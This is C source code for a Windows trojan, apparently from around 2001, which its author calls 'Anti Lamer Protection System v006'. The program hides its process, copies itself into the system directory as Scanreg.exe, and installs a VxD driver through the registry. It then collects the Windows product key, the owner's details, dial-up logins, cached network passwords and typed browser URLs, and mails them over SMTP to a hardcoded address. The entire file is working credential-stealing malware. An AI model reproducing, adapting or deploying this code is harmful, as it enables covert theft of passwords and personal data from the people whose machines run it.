/********************************************************************/
/*                Anti Lamer Protection System v006                 */
/*         Algus(c) - algusmail@mail.ru - http://algus.da.ru        */
/********************************************************************/

#include <windows.h>
#include <stdio.h>
#include <string.h>

// препроцессорные директивы
#define SHORT_BUFFER_SIZE 0x100
#define LONG_BUFFER_SIZE 0x1000

// эти данные необходимо изменить для настройки ALPS
#define EXE_PATH 1 // 0 = %windir% , 1 = %sysdir%
#define EXE_NAME "Scanreg.exe"
#define VXD_DESCRIPTION "VMMIO"
#define VXD_NAME "Vmmio.vxd"

#define HOST_NAME "smtp.mail.ru"
#define HOST_PORT 25
#define MAILER "ALPS v006"
#define MAIL_TO "algusmail@mail.ru"
#define MAIL_FROM "algusmail@mail.ru"
#define SUBJECT "message from ALPS v006 - Algus(c) 2001 - algusmail@mail.ru"
// конец настроек

#define MAX_NUMBER_OF_URLS 50

#define RECIEVE(code)\
	{\
        a = recv(s, sz1, sizeof(sz1), NULL);\
        if (a == SOCKET_ERROR) goto goto_on_error;\
        sz1[a] = 0;\
		if (!strstr(sz1, code)) goto goto_on_error;\
    }
#define SEND(data, datalen)\
    {\
        b = 0;\
	    while (b < datalen) {\
            a = send(s, (char*) (data + b), datalen - b, NULL);\
            if (a == SOCKET_ERROR) goto goto_on_error;\
            b += a;\
        };\
    }

// определения типов
typedef DWORD (WINAPI *LPREGISTERSERVICEPROCESS) (DWORD, DWORD);

struct STRUCT_PASSWORD_CACHE {
    WORD wStructSize;
    WORD wResourceSize;
    WORD wPasswordSize;
    BYTE byStructIndex;
    BYTE byStructType;
    BYTE byResourceStart[1];
};
typedef STRUCT_PASSWORD_CACHE* LPSTRUCT_PASSWORD_CACHE;
typedef WORD (WINAPI WNetEnumCachedPasswords) (LPSTR, WORD, BYTE, void*, DWORD);
typedef WNetEnumCachedPasswords* LPWNETENUMCACHEDPASSWORDS;

// инициализация переменных
    HINSTANCE hInstance;
    LPREGISTERSERVICEPROCESS lpRegisterServiceProcess;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	HRSRC hResSrc;
    HGLOBAL hRes;
    HANDLE hFile;
	char sz1[SHORT_BUFFER_SIZE], sz2[SHORT_BUFFER_SIZE], szLong[LONG_BUFFER_SIZE];
    MSG msg;
    BOOL IsBusy = FALSE;
    WSADATA wsaData;
    SOCKET s;
    ULONG ulAddress;
    HOSTENT *ptrHost;
    SOCKADDR_IN sin;
    UINT a, b;
    SYSTEMTIME st;
    TIME_ZONE_INFORMATION tzi;
    const char* Day[7] = {"Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"};
    const char* Month[12] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
    HKEY hKey1, hKey2;
	DWORD dw1, dw2;
    unsigned short i, j;
    LPWNETENUMCACHEDPASSWORDS lpWNetEnumCachedPasswords;
	char* ptrszLong = szLong;

/*------- CALLBACK-функция запроса паролей -------------------------*/
BOOL CALLBACK PasswordCache(LPSTRUCT_PASSWORD_CACHE lpStructPasswordCache, DWORD)
{
    memcpy(sz1, lpStructPasswordCache->byResourceStart, lpStructPasswordCache->wResourceSize);
    sz1[lpStructPasswordCache->wResourceSize] = 0;
    strcat(ptrszLong, "\nResource = ");
    strcat(ptrszLong, sz1);
    memcpy(sz2, lpStructPasswordCache->byResourceStart + lpStructPasswordCache->wResourceSize, lpStructPasswordCache->wPasswordSize);
    sz2[lpStructPasswordCache->wPasswordSize] = 0;
    strcat(ptrszLong, "\nPassword = ");
    strcat(ptrszLong, sz2);
    strcat(ptrszLong, "\n");
    return TRUE;
}

/*------- WinMain --------------------------------------------------*/
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
// скрыть процесс
    hInstance = LoadLibrary("KERNEL32.DLL");
    if (hInstance) {
		lpRegisterServiceProcess = (LPREGISTERSERVICEPROCESS) GetProcAddress(hInstance, "RegisterServiceProcess");
		if (lpRegisterServiceProcess) {
			lpRegisterServiceProcess(NULL, 1);
		}
		FreeLibrary(hInstance);
	}

// скопировать и запустить exe'шник, если надо
    if (EXE_PATH) {
        GetSystemDirectory(sz1, SHORT_BUFFER_SIZE);
    } else {
        GetWindowsDirectory(sz1, SHORT_BUFFER_SIZE);
    }
    strcat(sz1, "\\");
    strcat(sz1, EXE_NAME);
	CharUpperBuff(sz1, strlen(sz1));
    GetModuleFileName(NULL, sz2, SHORT_BUFFER_SIZE);
    if (strcmp(sz1, sz2)) {
        if (!CopyFile(sz2, sz1, FALSE)) return 0;
        memset(&si, NULL, sizeof(si));
        CreateProcess(sz1, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        ExitProcess(0);
    }

// установить vxd'уху, если надо
    GetSystemDirectory(sz1, SHORT_BUFFER_SIZE);
    strcat(sz1, "\\");
    strcat(sz1, VXD_NAME); 
    hResSrc = FindResource(NULL, MAKEINTRESOURCE(102), MAKEINTRESOURCE(101));
    if (hResSrc) {
		hRes = LoadResource(NULL, hResSrc);
		dw1 = SizeofResource(NULL, hResSrc);
		hFile = CreateFile(sz1, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
		if (WriteFile(hFile, hRes, dw1, &dw2, NULL)) {
			CloseHandle(hFile);
			strcpy(sz1, "System\\CurrentControlSet\\Services\\VxD\\");
			strcat(sz1, VXD_DESCRIPTION);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, sz1, NULL, "", REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey1, NULL);
			if (hKey1) {
				RegSetValueEx(hKey1, "StaticVxD", NULL, REG_SZ, (LPBYTE) VXD_NAME, strlen(VXD_NAME));
				RegSetValueEx(hKey1, "Start", NULL, REG_BINARY, (LPBYTE) "" , 1);
				RegCloseKey(hKey1);
			}
		}
	}

// инициализировать winsock
    if (WSAStartup(MAKEWORD(1, 1), &wsaData)) return 0;

// инициализировать цикл сообщений с помощью таймера
	SetTimer(NULL, NULL, 10000, NULL);
    while (GetMessage(&msg, NULL, NULL, NULL)) if (msg.message == WM_TIMER && !IsBusy) {
		IsBusy = TRUE;

// открыть сокет
        s = socket(AF_INET, SOCK_STREAM, NULL);
        if (s == INVALID_SOCKET) goto goto_on_error;

// получить данные о сервере
        ulAddress = inet_addr(HOST_NAME);
        if (ulAddress == INADDR_NONE) {
            ptrHost = gethostbyname(HOST_NAME);
            if (!ptrHost) goto goto_on_error;
            memcpy(&sin.sin_addr, ptrHost->h_addr_list[0], sizeof(IN_ADDR));
        } else {
            memcpy(&sin.sin_addr, &ulAddress, 4);
        };
        sin.sin_family = AF_INET;
        sin.sin_port   = htons(HOST_PORT);

// установить соединение с сервером
        if (connect(s, (PSOCKADDR)&sin, sizeof(SOCKADDR))) goto goto_on_error;
        RECIEVE("220");

// отправить письмо
        gethostname(sz2, sizeof(sz2));
        sprintf(sz1, "HELO %s\r\n" ,sz2);
        SEND(sz1, strlen(sz1)); // hello server
        RECIEVE("250");
        sprintf(sz1, "MAIL FROM:<%s>\r\n", MAIL_FROM);
        SEND(sz1, strlen(sz1)); // mail from
        RECIEVE("250");
        sprintf(sz1, "RCPT TO:<%s>\r\n", MAIL_TO);
        SEND(sz1, strlen(sz1)); // mail to
        RECIEVE("25");
        strcpy(sz1, "DATA\r\n");
        SEND(sz1, strlen(sz1)); // data begin
        RECIEVE("354");
        GetLocalTime(&st);
        GetTimeZoneInformation(&tzi);
        sprintf(sz2, "%s, %2.2u %s %u %2.2u:%2.2u:%2.2u", Day[st.wDayOfWeek], st.wDay, Month[st.wMonth-1], st.wYear, st.wHour, st.wMinute, st.wSecond);
        sprintf(sz1, "Date: %s %+2.2i%2.2u\n", sz2, -tzi.Bias/60, abs(tzi.Bias)%60);
        SEND(sz1, strlen(sz1)); // дата и время
        sprintf(sz1, "X-Mailer: %s\n", MAILER);
        SEND(sz1, strlen(sz1)); // мэйлер
        sprintf(sz1, "To: %s\n", MAIL_TO);
        SEND(sz1, strlen(sz1)); // кому
        sprintf(sz1, "From: %s\n", MAIL_FROM);
        SEND(sz1,strlen(sz1)); // от кого
        sprintf(sz1, "Subject: %s\n", SUBJECT);
        SEND(sz1, strlen(sz1)); // тема

		dw2 = SHORT_BUFFER_SIZE;

// отослать данные о компьютере
	    strcpy(szLong, "------------- COMPUTER INFORMATION -------------\n\n");
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", NULL, KEY_READ, &hKey1) == ERROR_SUCCESS) {
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "ProductName", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "ProductName = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "Version", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "Version = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "VersionNumber", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "VersionNumber = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "SubVersionNumber", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "SubVersionNumber = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "ProductID", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "ProductID = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "ProductKey", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "ProductKey = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "SystemRoot", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "SystemRoot = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "RegisteredOwner", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "RegisteredOwner = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "RegisteredOrganization", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "RegisteredOrganization = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
            RegCloseKey(hKey1);
        }
        SEND(szLong, strlen(szLong));

// отослать данные о сети
		strcpy(szLong, "\n\n------------- NETWORK INFORMATION --------------\n\n");
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\VxD\\VNETSUP", NULL, KEY_READ, &hKey1) == ERROR_SUCCESS) {
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "ComputerName", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
		            sprintf(sz1, "ComputerName = %s\n", sz2);
			        strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "Workgroup", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
					sprintf(sz1, "Workgroup = %s\n" ,sz2);
					strcat(szLong, sz1);
					break;
				}
			}
			for (i = 0; i < 5; i++) {
				if (RegQueryValueEx(hKey1, "Comment", NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
					sprintf(sz1, "Comment = %s\n" ,sz2);
					strcat(szLong, sz1);
					break;
				}
			}
            RegCloseKey(hKey1);
        }
        SEND(szLong, strlen(szLong));

// отослать логины
        strcpy(szLong, "\n\n-------------------- LOGINS --------------------\n");
		if (RegOpenKeyEx(HKEY_CURRENT_USER, "RemoteAccess\\Profile", NULL, KEY_ENUMERATE_SUB_KEYS, &hKey1) == ERROR_SUCCESS) {
			dw1 = 0;
			while (RegEnumKeyEx(hKey1, dw1, sz1, &dw2, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS) {
				if (RegOpenKeyEx(hKey1, sz1, NULL, KEY_QUERY_VALUE, &hKey2) == ERROR_SUCCESS) {
					strcat(szLong, "\nEntryName = ");
					strcat(szLong, sz1);
					strcat(szLong, "\n");
					for (i = 0; i < 5; i++) {
						if (RegQueryValueEx(hKey2, "User", NULL, NULL, (LPBYTE) sz1, &dw2) == ERROR_SUCCESS) {
							strcat(szLong, "Login = ");
							strcat(szLong, sz1);
							strcat(szLong, "\n");
							break;
						}
					}
					RegCloseKey(hKey2);
				}
				dw1++;
			}
			RegCloseKey(hKey1);
		}
		SEND(szLong,strlen(szLong));

// отослать пароли
        strcpy(szLong, "\n\n------------------ PASSWORDS -------------------\n");
		hInstance = LoadLibrary("MPR.DLL");
	    if (hInstance) {
			lpWNetEnumCachedPasswords = (LPWNETENUMCACHEDPASSWORDS) GetProcAddress(hInstance, "WNetEnumCachedPasswords");
			if (lpWNetEnumCachedPasswords) {
				lpWNetEnumCachedPasswords(NULL, NULL, 0xFF, PasswordCache, NULL);
			}
		FreeLibrary(hInstance);
		}
		SEND(szLong,strlen(szLong));

// отослать адреса страниц
        strcpy(szLong, "\n\n----------------- RECENT URLS ------------------\n\n");
		if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs", NULL, KEY_QUERY_VALUE, &hKey1) == ERROR_SUCCESS) {
			for(i = 1; j <= MAX_NUMBER_OF_URLS; i++) {
				sprintf(sz1, "url%d", i);
				for (j = 0; j < 5; j++) {
					if (RegQueryValueEx(hKey1, sz1, NULL, NULL, (LPBYTE) sz2, &dw2) == ERROR_SUCCESS) {
			            sprintf(sz1, "url%d = %s\n", i, sz2);
				        strcat(szLong, sz1);
						break;
					}
				}
				if (j == 5) break;
			}
			RegCloseKey(hKey1);
		}
		SEND(szLong,strlen(szLong));

// завершить соединение
		strcpy(sz1, "\r\n.\r\n");
        SEND(sz1, strlen(sz1)); // data end
        RECIEVE("250");
        strcpy(sz1, "QUIT\r\n");
        SEND(sz1, strlen(sz1)); // quit

// закрыть сокет и выгрузиться
        closesocket(s);
        WSACleanup();
        ExitProcess(0);

goto_on_error:
// закрыть сокет и завершить цикл
        if (s != INVALID_SOCKET) closesocket(s);
        IsBusy = FALSE;
    }
	
	return 0;
}